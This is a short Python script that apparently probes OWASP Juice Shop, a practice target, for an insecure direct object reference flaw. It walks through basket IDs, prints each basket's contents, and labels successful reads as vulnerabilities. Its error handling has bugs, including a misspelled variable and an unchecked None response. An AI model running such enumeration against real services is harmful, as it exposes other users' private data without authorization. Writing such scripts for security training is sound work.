import requests as r
import json
import pprint
from endpoints import juice_shop
from endpoints import headers


def get_basket_response(userId):
    try:
        session = r.Session()
        basket_endpoint = juice_shop["basket"]
        response = session.get(basket_endpoint + str(userId), headers=headers, timeout=5)
        return response
    except r.exceptions.RequestException as e:
        print(f"Error accessing basket {userdId}: {e}")
        return None


def display_basket_body_and_status(start_id = 1, end_id=6):
    for num in range(start_id, end_id):
        basket_response = get_basket_response(num)
        print(f"Basket {num} \nStatus: {basket_response.status_code}")
        try:
            data = basket_response.json()
            if basket_response.status_code == 200:
                print(f"✓ VULNERABILITY: Accessed basket {num} successfully")
            elif basket_response.status_code == 401:
                print(f"✗ Access denied (expected)")
            pprint.pprint(data)
        except json.JSONDecodeError:
            print(basket_response.text)

if __name__ == "__main__":
    display_basket_body_and_status(1, 10)